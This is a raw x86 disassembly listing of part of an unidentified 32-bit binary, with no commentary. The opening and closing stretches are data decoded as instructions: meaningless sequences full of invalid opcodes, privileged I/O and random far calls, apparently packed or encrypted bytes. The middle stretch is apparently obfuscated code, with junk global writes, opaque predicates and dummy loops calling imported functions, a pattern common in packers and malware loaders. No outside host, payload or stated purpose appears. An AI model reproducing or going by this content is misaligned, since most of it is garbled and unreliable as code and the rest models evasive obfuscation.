  41c176:	inc    eax
  41c177:	jl     0x41c117
  41c179:	popf   
  41c17a:	xchg   ebp,eax
  41c17b:	xor    DWORD PTR [edx+0x62],esi
  41c17e:	mov    dl,0x3f
  41c180:	in     al,dx
  41c181:	(bad)  
  41c182:	mov    ds:0xb623e58a,eax
  41c187:	xchg   BYTE PTR ds:0xa36e5153,ch
  41c18d:	mov    ds:0x917cd6b5,al
  41c192:	mov    al,ds:0x58ab489b
  41c197:	xchg   esi,eax
  41c198:	push   es
  41c199:	mov    ebx,0x81bf7bf
  41c19e:	data16 mov al,ds:0x5e069fc3
  41c1a4:	fld    TBYTE PTR [edi]
  41c1a6:	call   0x12d5:0x9fdcb593
  41c1ad:	adc    BYTE PTR [ecx+0x2bd616d6],0x8c
  41c1b4:	mov    ecx,0xd1506e4f
  41c1b9:	xchg   esi,eax
  41c1ba:	test   ebx,0x3a675b85
  41c1c0:	sbb    al,0x1b
  41c1c2:	dec    esp
  41c1c3:	sbb    BYTE PTR [ebp+0x7cfcecd2],al
  41c1c9:	into   
  41c1ca:	sub    cl,ch
  41c1cc:	dec    esi
  41c1cd:	pop    ds
  41c1ce:	mov    dh,0x5c
  41c1d0:	mov    ch,0x75
  41c1d2:	les    esp,FWORD PTR [ecx]
  41c1d4:	push   ebx
  41c1d5:	inc    ebx
  41c1d6:	add    ah,cl
  41c1d8:	sbb    BYTE PTR [eax+eiz*2],cl
  41c1db:	mov    ecx,0x800dd4d9
  41c1e0:	add    eax,0x9fe5d519
  41c1e5:	mov    WORD PTR [edx+0x2662bf37],cs
  41c1eb:	adc    DWORD PTR [edi+0x4a],eax
  41c1ee:	mov    WORD PTR [eax-0x74],es
  41c1f1:	xor    BYTE PTR [ebx-0x4a],ah
  41c1f4:	cli    
  41c1f5:	mov    bl,0x4f
  41c1f7:	jnp    0x41c203
  41c1f9:	popf   
  41c1fa:	xor    edx,DWORD PTR [ebx-0x4d]
  41c1fd:	cmp    al,0x17
  41c1ff:	or     ch,0xac
  41c202:	imul   esi,DWORD PTR [edi+0x3c],0x3f
  41c206:	cmp    esp,DWORD PTR [edx+ebx*8+0x52]
  41c20a:	and    eax,0x2524e9f2
  41c20f:	and    ecx,0x590f4fde
  41c215:	xchg   edx,eax
  41c216:	jb     0x41c1c2
  41c218:	dec    esi
  41c219:	pop    edi
  41c21a:	retf   0xb539
  41c21d:	adc    DWORD PTR [ecx],0x1c
  41c220:	fmulp  st(1),st
  41c222:	push   ds
  41c223:	jge    0x41c27b
  41c225:	mov    edx,0x89283674
  41c22a:	(bad)
  41c22d:	cli    
  41c22e:	pop    esp
  41c22f:	mov    esi,0xaea6b1b
  41c234:	ja     0x41c249
  41c236:	mov    ch,0xc0
  41c238:	xor    eax,0x899a2bcc
  41c23d:	adc    ah,BYTE PTR ds:0x295fd110
  41c243:	pushf  
  41c244:	cmp    ebx,eax
  41c246:	sbb    eax,0xe69b7189
  41c24b:	cmp    BYTE PTR [ebp+ecx*1-0x695495d0],0x2e
  41c253:	adc    eax,0xaa77950a
  41c258:	lock cmp cl,dh
  41c25b:	or     edi,edx
  41c25d:	add    dh,BYTE PTR [ecx]
  41c25f:	arpl   WORD PTR [ebp+0x28],bp
  41c262:	aad    0xb4
  41c264:	fwait
  41c265:	jbe    0x41c2c7
  41c267:	repnz (bad) 
  41c26a:	cs mov eax,0xe9031086
  41c270:	xchg   esi,eax
  41c271:	inc    ebx
  41c272:	adc    DWORD PTR [edi+0x64],0xe4506019
  41c279:	dec    edi
  41c27a:	pusha  
  41c27b:	out    dx,al
  41c27c:	hlt    
  41c27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c27e:	fist   DWORD PTR [edx+0x1864b97e]
  41c284:	push   ebp
  41c285:	pop    es
  41c286:	mov    al,ds:0xc1b0fe87
  41c28b:	jo     0x41c235
  41c28d:	xlat   BYTE PTR ds:[ebx]
  41c28e:	out    dx,al
  41c28f:	gs adc eax,0xe42c2b60
  41c295:	int    0xde
  41c297:	inc    edx
  41c298:	fs xor al,0x35
  41c29b:	pop    ebx
  41c29c:	jo     0x41c262
  41c29e:	(bad)  
  41c29f:	je     0x41c2b5
  41c2a1:	push   DWORD PTR [edx]
  41c2a3:	sbb    al,0x72
  41c2a5:	sub    DWORD PTR [ebp-0x54],esp
  41c2a8:	mov    ch,0x5d
  41c2aa:	ins    DWORD PTR es:[edi],dx
  41c2ab:	inc    edx
  41c2ac:	push   es
  41c2ad:	popa   
  41c2ae:	cwde   
  41c2af:	nop
  41c2b0:	je     0x41c29d
  41c2b2:	int    0x0
  41c2b4:	arpl   WORD PTR [eax-0x7d2e0927],ax
  41c2ba:	mov    BYTE PTR [ebx-0x12e67d00],ch
  41c2c0:	push   0x37
  41c2c2:	imul   eax,DWORD PTR [edi-0x3],0x1c
  41c2c6:	and    BYTE PTR [ecx],dl
  41c2c8:	or     al,0xc0
  41c2ca:	add    al,0xcc
  41c2cc:	inc    esi
  41c2cd:	add    BYTE PTR [ecx+0x3dfc38ba],ch
  41c2d3:	and    ch,BYTE PTR [edx]
  41c2d5:	lods   eax,DWORD PTR ds:[esi]
  41c2d6:	or     BYTE PTR [ebp+ebx*4+0x59062fbb],dl
  41c2dd:	jbe    0x41c2d4
  41c2df:	(bad)  
  41c2e0:	fst    DWORD PTR [ecx-0x20]
  41c2e3:	idiv   DWORD PTR [edi+0x6a]
  41c2e6:	mov    ebx,0x741569b5
  41c2eb:	ss pop ecx
  41c2ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2ee:	xchg   ebx,eax
  41c2ef:	ds out dx,al
  41c2f1:	icebp  
  41c2f2:	mov    BYTE PTR [eax+0x28],dh
  41c2f5:	pop    ds
  41c2f6:	jb     0x41c2f0
  41c2f8:	dec    ebx
  41c2f9:	sti    
  41c2fa:	push   es
  41c2fb:	add    eax,0x1602b214
  41c300:	mov    bh,0xb4
  41c302:	cs jmp 0x939c:0xad14a708
  41c30a:	gs ror dh,0x74
  41c30e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c30f:	cmp    eax,0x66cac2a1
  41c314:	icebp  
  41c315:	cmp    dl,BYTE PTR ds:0xd6b5fdef
  41c31b:	(bad)  [ebx-0x6dea7ff5]
  41c321:	pop    ebx
  41c322:	and    edx,DWORD PTR [edx]
  41c324:	jp     0x41c2b0
  41c326:	sahf   
  41c327:	or     ebp,DWORD PTR [esi+edi*1]
  41c32a:	push   edi
  41c32b:	cmp    eax,0x12f1f482
  41c330:	ja     0x41c3af
  41c332:	aad    0x2d
  41c334:	mov    eax,DWORD PTR [edx+eiz*1]
  41c337:	xchg   ebx,eax
  41c338:	add    BYTE PTR [ebp+0x25c236d1],ah
  41c33e:	mov    es,WORD PTR [eax+0x5e]
  41c341:	sbb    DWORD PTR [eax+0x2a],ebx
  41c344:	lahf   
  41c345:	(bad)  
  41c346:	std    
  41c347:	or     BYTE PTR [ecx+0x67b47883],al
  41c34d:	sbb    edi,DWORD PTR [esi+0x78]
  41c350:	xchg   esp,eax
  41c351:	add    al,0x13
  41c353:	sub    ch,BYTE PTR [ecx]
  41c355:	or     bh,BYTE PTR [edx-0xf743007]
  41c35b:	add    BYTE PTR [ecx+0x56df4a4a],bh
  41c361:	mov    cl,0x18
  41c363:	push   edi
  41c364:	stos   DWORD PTR es:[edi],eax
  41c365:	fdivr  st,st(1)
  41c367:	stos   BYTE PTR es:[edi],al
  41c368:	in     eax,0x41
  41c36a:	sbb    DWORD PTR [ecx],ecx
  41c36c:	clc    
  41c36d:	(bad)  
  41c36e:	fbld   TBYTE PTR [eax]
  41c370:	push   ebp
  41c371:	int    0x1e
  41c373:	xchg   ecx,eax
  41c374:	add    DWORD PTR [eax],0xd220fea0
  41c37a:	mov    edi,DWORD PTR [ebp+0x76]
  41c37d:	daa    
  41c37e:	call   0xb641246c
  41c383:	clc    
  41c384:	adc    al,0xb3
  41c386:	fiadd  DWORD PTR [esi]
  41c388:	and    al,0xf
  41c38a:	mov    edi,0x1ccad33a
  41c38f:	or     ebx,edx
  41c391:	leave  
  41c392:	jo     0x41c359
  41c394:	inc    ebp
  41c395:	cmp    eax,ebx
  41c397:	aas    
  41c398:	xchg   DWORD PTR [ecx-0x3d],ebx
  41c39b:	adc    edx,DWORD PTR [ebp+0x0]
  41c39e:	inc    eax
  41c39f:	scas   al,BYTE PTR es:[edi]
  41c3a0:	jl     0x41c324
  41c3a2:	xchg   esp,eax
  41c3a3:	pop    ecx
  41c3a4:	sub    BYTE PTR [edx],cl
  41c3a6:	imul   ecx,DWORD PTR [edx],0xffffffb8
  41c3a9:	xor    ah,BYTE PTR [edi+0x6a23a034]
  41c3af:	push   ss
  41c3b0:	or     ebp,ecx
  41c3b2:	ins    DWORD PTR es:[edi],dx
  41c3b3:	pop    esi
  41c3b4:	inc    eax
  41c3b5:	pushf  
  41c3b6:	lahf   
  41c3b7:	mov    bh,0x92
  41c3b9:	cmp    DWORD PTR [ebp-0x2ce610eb],esp
  41c3bf:	ror    DWORD PTR [edx-0x25],1
  41c3c2:	xchg   esp,eax
  41c3c3:	rcr    BYTE PTR [ebx+0x78],1
  41c3c6:	sub    eax,DWORD PTR [edx+0x7a]
  41c3c9:	mov    ecx,0x8a85
  41c3ce:	sbb    DWORD PTR ds:0x42c00c,0x42a01c
  41c3d8:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c3dd:	and    DWORD PTR ds:0x428004,0x297a
  41c3e7:	mov    edi,0x3b4b
  41c3ec:	add    DWORD PTR ds:0x42901c,0x4e21
  41c3f6:	add    cx,di
  41c3f9:	and    DWORD PTR ds:0x428024,0x9b5
  41c403:	movzx  ecx,cx
  41c406:	not    DWORD PTR ds:0x42801c
  41c40c:	mov    DWORD PTR [ebp-0x10],ecx
  41c40f:	and    ecx,DWORD PTR ds:0x42a01c
  41c415:	mov    ecx,DWORD PTR [ebp+0x8]
  41c418:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c41c:	xor    ecx,0x8a85
  41c422:	add    ecx,edi
  41c424:	mov    edi,0x7b07
  41c429:	mov    edi,DWORD PTR [ebp-0x10]
  41c42c:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c433:	inc    edx
  41c434:	mov    DWORD PTR ds:0x428024,0x7111
  41c43e:	mov    ecx,DWORD PTR [ebp-0x18]
  41c441:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c44b:	cmp    edx,ecx
  41c44d:	mov    DWORD PTR ds:0x42c01c,0x291f
  41c457:	jne    0x41a04b
  41c45d:	mov    ecx,DWORD PTR [ebp-0x14]
  41c460:	add    DWORD PTR ds:0x42c008,edi
  41c466:	mov    edx,DWORD PTR [ebp+0x10]
  41c469:	xor    ecx,eax
  41c46b:	add    DWORD PTR ds:0x42a014,0x777
  41c475:	add    ecx,esi
  41c477:	mov    DWORD PTR [edx],ecx
  41c479:	or     DWORD PTR ds:0x42c014,edi
  41c47f:	mov    ecx,DWORD PTR [ebp-0x14]
  41c482:	xor    ecx,eax
  41c484:	add    ecx,esi
  41c486:	mov    DWORD PTR [ebp-0x20],ecx
  41c489:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c490:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c497:	mov    DWORD PTR ds:0x42a000,0x393
  41c4a1:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c4a8:	movzx  ecx,WORD PTR ds:0x42a008
  41c4af:	mov    ecx,DWORD PTR [ebp-0xc]
  41c4b2:	mov    DWORD PTR [ebp+0x8],ecx
  41c4b5:	jmp    0x41c6f7
  41c4ba:	mov    ecx,DWORD PTR ds:0x428024
  41c4c0:	add    DWORD PTR ds:0x429008,ecx
  41c4c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4c9:	sbb    edx,DWORD PTR ds:0x429018
  41c4cf:	mov    edx,DWORD PTR [ebp-0x8]
  41c4d2:	or     DWORD PTR ds:0x429010,0x42a010
  41c4dc:	xor    ecx,eax
  41c4de:	xor    edx,eax
  41c4e0:	adc    DWORD PTR ds:0x42a014,0x429000
  41c4ea:	sub    ecx,edx
  41c4ec:	adc    edx,DWORD PTR ds:0x42b010
  41c4f2:	sub    ecx,esi
  41c4f4:	mov    DWORD PTR ds:0x428018,0x60a2
  41c4fe:	xor    ecx,eax
  41c500:	mov    DWORD PTR [ebp+0x8],ecx
  41c503:	and    ecx,0x319e
  41c509:	mov    ecx,DWORD PTR [ebp+0x8]
  41c50c:	or     edx,DWORD PTR ds:0x428008
  41c512:	mov    edx,DWORD PTR [ebp-0x64]
  41c515:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c51c:	mov    DWORD PTR [ebp-0x64],ecx
  41c51f:	or     DWORD PTR ds:0x42901c,0xdce
  41c529:	mov    ecx,DWORD PTR [ebp+0x8]
  41c52c:	movzx  edx,BYTE PTR ds:0x429000
  41c533:	xor    DWORD PTR ds:0x42c004,edx
  41c539:	mov    edx,DWORD PTR [ebp-0x60]
  41c53c:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c543:	not    edx
  41c545:	mov    DWORD PTR [ebp-0x60],ecx
  41c548:	xor    ecx,ecx
  41c54a:	or     ecx,DWORD PTR ds:0x428008
  41c550:	adc    ecx,DWORD PTR ds:0x42901c
  41c556:	mov    DWORD PTR ds:0x428008,ecx
  41c55c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c55f:	and    DWORD PTR ds:0x42b018,0x0
  41c569:	mov    edx,DWORD PTR ds:0x42b018
  41c56f:	inc    edx
  41c570:	mov    DWORD PTR ds:0x42b018,edx
  41c576:	cmp    DWORD PTR ds:0x42b018,0x1b
  41c57d:	jne    0x41c5ad
  41c583:	push   0x42c004
  41c588:	push   0x28d8
  41c58d:	push   0x39eb
  41c592:	push   0x42801c
  41c597:	push   0x11e7
  41c59c:	push   0x42351e
  41c5a1:	push   DWORD PTR [ebp-0x1c]
  41c5a4:	push   DWORD PTR [ebp-0x1c]
  41c5a7:	call   DWORD PTR ds:0x424024
  41c5ad:	cmp    DWORD PTR ds:0x42b018,0x17
  41c5b4:	jb     0x41c569
  41c5ba:	or     DWORD PTR ds:0x42a018,0x7d26
  41c5c4:	mov    edx,DWORD PTR [ebp-0x5c]
  41c5c7:	sbb    DWORD PTR ds:0x42c008,0x428018
  41c5d1:	lea    ecx,[edx+ecx*1+0x5708f4]
  41c5d8:	and    DWORD PTR ds:0x42c00c,edx
  41c5de:	mov    DWORD PTR [ebp-0x5c],ecx
  41c5e1:	and    edx,0x6d7b
  41c5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ea:	mov    edx,DWORD PTR [ebp-0x58]
  41c5ed:	mov    DWORD PTR ds:0x428028,0xea2
  41c5f7:	lea    ecx,[edx+ecx*1+0x5708fb]
  41c5fe:	mov    DWORD PTR [ebp-0x58],ecx
  41c601:	mov    DWORD PTR ds:0x429010,0x14
  41c60b:	cmp    DWORD PTR ds:0x429010,0x0
  41c612:	je     0x41c6a5
  41c618:	cmp    DWORD PTR ds:0x429010,0x4
  41c61f:	jne    0x41c636
  41c625:	push   0x3e6d
  41c62a:	push   DWORD PTR [ebp-0x28]
  41c62d:	push   DWORD PTR [ebp-0x10]
  41c630:	call   DWORD PTR ds:0x424028
  41c636:	cmp    DWORD PTR ds:0x429010,0x5
  41c63d:	jne    0x41c652
  41c643:	xor    edx,edx
  41c645:	add    edx,DWORD PTR ds:0x429010
  41c64b:	dec    edx
  41c64c:	mov    DWORD PTR ds:0x429010,edx
  41c652:	mov    edx,DWORD PTR ds:0x429010
  41c658:	dec    edx
  41c659:	mov    DWORD PTR ds:0x429010,edx
  41c65f:	jmp    0x41c60b
  41c664:	and    DWORD PTR ds:0x428018,0x0
  41c66e:	mov    edx,DWORD PTR ds:0x428018
  41c674:	inc    edx
  41c675:	mov    DWORD PTR ds:0x428018,edx
  41c67b:	cmp    DWORD PTR ds:0x428018,0x20
  41c682:	jne    0x41c698
  41c688:	push   0x42362d
  41c68d:	push   0x423644
  41c692:	call   DWORD PTR ds:0x424030
  41c698:	cmp    DWORD PTR ds:0x428018,0x19
  41c69f:	jb     0x41c66e
  41c6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6a8:	mov    edx,DWORD PTR [ebp-0x54]
  41c6ab:	adc    DWORD PTR ds:0x429000,0x42b000
  41c6b5:	lea    ecx,[edx+ecx*1+0x5708fa]
  41c6bc:	mov    DWORD PTR [ebp-0x54],ecx
  41c6bf:	not    edx
  41c6c1:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6c4:	mov    edx,DWORD PTR ds:0x42901c
  41c6ca:	and    edx,DWORD PTR ds:0x42c004
  41c6d0:	mov    DWORD PTR ds:0x42901c,edx
  41c6d6:	mov    edx,DWORD PTR [ebp-0x50]
  41c6d9:	sbb    DWORD PTR ds:0x428010,0x6c9
  41c6e3:	lea    ecx,[edx+ecx*1+0x5708f9]
  41c6ea:	or     DWORD PTR ds:0x42c018,0x5b89
  41c6f4:	mov    DWORD PTR [ebp-0x50],ecx
  41c6f7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6fa:	xor    DWORD PTR ds:0x42c000,0x390a
  41c704:	xor    ecx,eax
  41c706:	sbb    DWORD PTR ds:0x428020,0x44b0
  41c710:	add    ecx,esi
  41c712:	jne    0x41c4ba
  41c718:	jmp    0x41ed36
  41c71d:	xor    edx,edx
  41c71f:	add    edx,DWORD PTR ds:0x42172a
  41c725:	mov    ecx,DWORD PTR ds:0x42350a
  41c72b:	sub    ecx,edx
  41c72d:	and    edx,DWORD PTR [edx+ecx*1]
  41c730:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c733:	sub    DWORD PTR ds:0x42b00c,0x42a008
  41c73d:	mov    edx,DWORD PTR [ebp-0x8]
  41c740:	xor    ecx,eax
  41c742:	or     DWORD PTR ds:0x42c014,0x2e7c
  41c74c:	xor    edx,eax
  41c74e:	sub    ecx,edx
  41c750:	sub    ecx,esi
  41c752:	xor    ecx,eax
  41c754:	mov    DWORD PTR [ebp-0x1c],ecx
  41c757:	mov    ecx,0x464b
  41c75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c75f:	mov    DWORD PTR [ebp+0x8],ecx
  41c762:	jmp    0x41c827
  41c767:	and    DWORD PTR ds:0x42a008,0x0
  41c771:	jmp    0x41c783
  41c776:	mov    edi,DWORD PTR ds:0x42a008
  41c77c:	inc    edi
  41c77d:	mov    DWORD PTR ds:0x42a008,edi
  41c783:	cmp    DWORD PTR ds:0x42a008,0x11
  41c78a:	jae    0x41c7ee
  41c790:	cmp    DWORD PTR ds:0x42a008,0x6
  41c797:	jne    0x41c7b9
  41c79d:	push   DWORD PTR [ebp-0x14]
  41c7a0:	push   DWORD PTR [ebp-0x18]
  41c7a3:	push   DWORD PTR [ebp-0x10]
  41c7a6:	push   DWORD PTR [ebp-0x10]
  41c7a9:	push   0x7583
  41c7ae:	push   0x42b000
  41c7b3:	call   DWORD PTR ds:0x424038
  41c7b9:	cmp    DWORD PTR ds:0x42a008,0x5
  41c7c0:	jne    0x41c7d5
  41c7c6:	xor    edi,edi
  41c7c8:	or     edi,DWORD PTR ds:0x42a008
  41c7ce:	inc    edi
  41c7cf:	mov    DWORD PTR ds:0x42a008,edi
  41c7d5:	jmp    0x41c776
  41c7da:	xor    ecx,ecx
  41c7dc:	add    ecx,DWORD PTR ds:0x42b000
  41c7e2:	adc    ecx,DWORD PTR ds:0x42b008
  41c7e8:	mov    DWORD PTR ds:0x42b000,ecx
  41c7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7f1:	mov    edx,DWORD PTR ds:0x42c018
  41c7f7:	sbb    DWORD PTR ds:0x42a01c,edx
  41c7fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c800:	xor    ecx,eax
  41c802:	xor    edx,eax
  41c804:	sub    ecx,edx
  41c806:	sub    ecx,esi
  41c808:	xor    ecx,eax
  41c80a:	mov    DWORD PTR [ebp+0x8],ecx
  41c80d:	mov    ecx,DWORD PTR [ebp+0x8]
  41c810:	mov    edx,DWORD PTR [ebp+0x8]
  41c813:	imul   edx,edx,0x5708f5
  41c819:	xor    ecx,eax
  41c81b:	add    ecx,esi
  41c81d:	lea    ecx,[ebp+ecx*4-0x64]
  41c821:	mov    edi,DWORD PTR [ecx]
  41c823:	add    edx,edi
  41c825:	mov    DWORD PTR [ecx],edx
  41c827:	mov    ecx,DWORD PTR [ebp+0x8]
  41c82a:	xor    ecx,eax
  41c82c:	add    ecx,esi
  41c82e:	jne    0x41c767
  41c834:	mov    ecx,DWORD PTR [ebp-0x20]
  41c837:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c83e:	mov    dl,BYTE PTR [ebp-0x1]
  41c841:	cmp    cl,dl
  41c843:	je     0x41c91c
  41c849:	mov    ecx,DWORD PTR [ebp-0x20]
  41c84c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c853:	mov    edx,DWORD PTR [ebp+0xc]
  41c856:	cmp    cl,BYTE PTR [edx]
  41c858:	jne    0x41ed48
  41c85e:	mov    ecx,DWORD PTR [ebp-0x14]
  41c861:	mov    edx,DWORD PTR [ebp+0xc]
  41c864:	movsx  edx,BYTE PTR [edx]
  41c867:	xor    ecx,eax
  41c869:	add    ecx,esi
  41c86b:	cmp    edx,ecx
  41c86d:	mov    ecx,DWORD PTR [ebp-0xc]
  41c870:	mov    DWORD PTR [ebp+0x8],ecx
  41c873:	mov    ecx,DWORD PTR [ebp+0x8]
  41c876:	je     0x42113d
  41c87c:	jmp    0x41c8b1
  41c881:	mov    ecx,DWORD PTR [ebp+0x8]
  41c884:	mov    edx,DWORD PTR [ebp-0x8]
  41c887:	xor    ecx,eax
  41c889:	xor    edx,eax
  41c88b:	sub    ecx,edx
  41c88d:	sub    ecx,esi
  41c88f:	xor    ecx,eax
  41c891:	mov    DWORD PTR [ebp+0x8],ecx
  41c894:	mov    ecx,DWORD PTR [ebp+0x8]
  41c897:	mov    edx,DWORD PTR [ebp+0x8]
  41c89a:	xor    ecx,eax
  41c89c:	imul   edx,edx,0x5708f5
  41c8a2:	add    ecx,esi
  41c8a4:	lea    ecx,[ebp+ecx*4-0x64]
  41c8a8:	mov    edi,DWORD PTR [ecx]
  41c8aa:	add    edx,edi
  41c8ac:	mov    DWORD PTR [ecx],edx
  41c8ae:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8b1:	xor    ecx,eax
  41c8b3:	add    ecx,esi
  41c8b5:	jne    0x41c881
  41c8bb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8be:	mov    edx,DWORD PTR [ebp+0x8]
  41c8c1:	xor    ecx,eax
  41c8c3:	xor    edx,eax
  41c8c5:	add    ecx,esi
  41c8c7:	add    edx,esi
  41c8c9:	cmp    ecx,edx
  41c8cb:	jae    0x41c961
  41c8d1:	lea    edx,[ecx-0x3272db]
  41c8d7:	mov    DWORD PTR [ebp-0x18],edx
  41c8da:	mov    edi,DWORD PTR [ebp-0x18]
  41c8dd:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41c8e4:	lea    edx,[ebp-0x24]
  41c8e7:	mov    DWORD PTR [ebp-0x10],edx
  41c8ea:	mov    edx,DWORD PTR [ebp-0x10]
  41c8ed:	add    DWORD PTR [edx],0x705fa08
  41c8f3:	mov    ebx,DWORD PTR [ebp-0x10]
  41c8f6:	xor    edi,eax
  41c8f8:	add    edi,DWORD PTR [ebx]
  41c8fa:	lea    edx,[ebp+ecx*4-0x64]
  41c8fe:	mov    ebx,DWORD PTR [edx]
  41c900:	xor    edi,ebx
  41c902:	mov    DWORD PTR [edx],edi
  41c904:	mov    edx,DWORD PTR [ebp+0x8]
  41c907:	xor    edx,eax
  41c909:	inc    ecx
  41c90a:	inc    DWORD PTR [ebp-0x18]
  41c90d:	add    edx,esi
  41c90f:	cmp    ecx,edx
  41c911:	jb     0x41c8da
  41c917:	jmp    0x41c961
  41c91c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c91f:	mov    DWORD PTR [ebp+0x8],ecx
  41c922:	jmp    0x41c954
  41c927:	mov    ecx,DWORD PTR [ebp+0x8]
  41c92a:	mov    edx,DWORD PTR [ebp-0x8]
  41c92d:	xor    ecx,eax
  41c92f:	xor    edx,eax
  41c931:	sub    ecx,edx
  41c933:	sub    ecx,esi
  41c935:	xor    ecx,eax
  41c937:	mov    DWORD PTR [ebp+0x8],ecx
  41c93a:	mov    ecx,DWORD PTR [ebp+0x8]
  41c93d:	mov    edx,DWORD PTR [ebp+0x8]
  41c940:	imul   edx,edx,0x5708f5
  41c946:	xor    ecx,eax
  41c948:	add    ecx,esi
  41c94a:	lea    ecx,[ebp+ecx*4-0x64]
  41c94e:	mov    edi,DWORD PTR [ecx]
  41c950:	add    edx,edi
  41c952:	mov    DWORD PTR [ecx],edx
  41c954:	mov    ecx,DWORD PTR [ebp+0x8]
  41c957:	xor    ecx,eax
  41c959:	add    ecx,esi
  41c95b:	jne    0x41c927
  41c961:	mov    ecx,DWORD PTR [ebp-0xc]
  41c964:	mov    DWORD PTR [ebp+0x8],ecx
  41c967:	jmp    0x41ed14
  41c96c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c96f:	mov    edx,DWORD PTR [ebp-0x8]
  41c972:	xor    ecx,eax
  41c974:	xor    edx,eax
  41c976:	sub    ecx,edx
  41c978:	jmp    0x41ecf3
  41c97d:	rcr    DWORD PTR [esi+0x158d36fd],1
  41c983:	imul   esp,DWORD PTR [ebp-0x6e],0xb80d858
  41c98a:	cmp    al,0xfb
  41c98c:	lock loope 0x41c98c
  41c98f:	popa   
  41c990:	bound  eax,QWORD PTR [edi+ebx*2]
  41c993:	bound  esp,QWORD PTR [edx+0x76]
  41c996:	retw   
  41c998:	int3   
  41c999:	mov    dl,0xac
  41c99b:	call   0xea90942f
  41c9a0:	jmp    0xbc277d6
  41c9a5:	xor    eax,DWORD PTR [edx+0x9]
  41c9a8:	ds ret 
  41c9aa:	jnp    0x41ca1d
  41c9ac:	ds cdq 
  41c9ae:	adc    esi,esi
  41c9b0:	outs   dx,DWORD PTR ds:[esi]
  41c9b1:	div    BYTE PTR [edx]
  41c9b3:	dec    esp
  41c9b4:	ret    
  41c9b5:	not    ecx
  41c9b7:	sub    DWORD PTR [ebx],eax
  41c9b9:	int3   
  41c9ba:	lahf   
  41c9bb:	jno    0x41c9cc
  41c9bd:	dec    ebp
  41c9be:	adc    eax,0x43e2bfa0
  41c9c3:	fisubr DWORD PTR [edi+0x37]
  41c9c6:	cwde   
  41c9c7:	push   0xffffffff
  41c9c9:	lods   eax,DWORD PTR ds:[esi]
  41c9ca:	je     0x41c99e
  41c9cc:	or     al,0x84
  41c9ce:	mov    fs,WORD PTR [edx-0x1a23b7d6]
  41c9d4:	gs jae 0x41ca51
  41c9d7:	ja     0x41c9e2
  41c9d9:	jbe    0x41c9ad
  41c9db:	in     al,0xc6
  41c9dd:	mov    ds:0x9479872a,al
  41c9e2:	jno    0x41c9ce
  41c9e4:	ficom  DWORD PTR [edi+0x79]
  41c9e7:	les    esp,FWORD PTR [edi]
  41c9e9:	out    dx,al
  41c9ea:	arpl   WORD PTR [edx+0x1929bfff],si
  41c9f0:	in     eax,dx
  41c9f1:	sti    
  41c9f2:	and    esi,edx
  41c9f4:	dec    ebx
  41c9f5:	xchg   BYTE PTR [ebx],bl
  41c9f7:	or     DWORD PTR [eax+0x19],edi
  41c9fa:	enter  0xdead,0x58
  41c9fe:	ss xchg ch,bl
  41ca01:	repz daa 
  41ca03:	std    
  41ca04:	rcr    BYTE PTR [ecx-0x79],0x27
  41ca08:	mov    BYTE PTR [eax-0x4042b140],ch
  41ca0e:	push   ecx
  41ca0f:	fstp   DWORD PTR [ecx+esi*8-0x78cd69f0]
  41ca16:	shl    BYTE PTR [ebx],1
  41ca18:	in     al,dx
  41ca19:	dec    esi
  41ca1a:	pusha  
  41ca1b:	in     al,0xa7
  41ca1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca1e:	dec    edi
  41ca1f:	or     DWORD PTR [esi+edx*1+0x39a194a5],edi
  41ca26:	xchg   BYTE PTR [ebx+0x400c1bb6],ah
  41ca2c:	call   0x900f:0xbaca2fc9
  41ca33:	or     cl,BYTE PTR [ebp-0x28de62b9]
  41ca39:	ins    BYTE PTR es:[edi],dx
  41ca3a:	add    dh,BYTE PTR [ecx-0x2fde8071]
  41ca40:	mov    dl,0x4c
  41ca42:	ret    
  41ca43:	and    esp,DWORD PTR [ecx+0x68865966]
  41ca49:	pop    edx
  41ca4a:	(bad)  
  41ca4c:	mov    eax,ds:0xacd3a99b
  41ca51:	inc    esi
  41ca52:	hlt    
  41ca53:	inc    edx
  41ca54:	or     al,0x7a
  41ca56:	fidiv  DWORD PTR [ebx+edi*4-0x4cae2081]
  41ca5d:	loope  0x41cac7
  41ca5f:	inc    esp
  41ca60:	add    bl,BYTE PTR [edi-0x6bd479c7]
  41ca66:	adc    al,0xa
  41ca68:	lds    esp,FWORD PTR [esi-0x8]
  41ca6b:	fnstcw WORD PTR [eax]
  41ca6d:	fucomp st(5)
  41ca6f:	sbb    BYTE PTR [ecx+ebp*1],bh
  41ca72:	stos   DWORD PTR es:[edi],eax
  41ca73:	inc    eax
  41ca74:	xchg   DWORD PTR [edi-0x27],ebp
  41ca77:	ss test al,0xe3
  41ca7a:	xor    al,0xd9
  41ca7c:	pop    eax
  41ca7d:	inc    esp
  41ca7e:	mov    BYTE PTR [edi-0x14],ch
  41ca81:	add    eax,0xa4295fba
  41ca86:	sbb    BYTE PTR [edx+ebp*1+0x44],bl
  41ca8a:	es xchg edi,eax
  41ca8c:	mov    bl,0xf1
